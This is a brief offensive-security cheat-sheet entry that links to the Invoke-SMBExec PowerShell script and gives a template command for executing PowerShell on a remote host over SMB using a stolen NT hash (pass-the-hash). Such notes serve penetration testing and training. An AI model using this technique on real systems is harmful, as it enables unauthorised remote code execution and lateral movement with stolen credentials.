### source
https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1  

### run command remotely
```
Invoke-SMBExec -Target <rhost> -Domain <domain> -User <user> -Command "powershell -c <command>" -Hash <nthash>
```

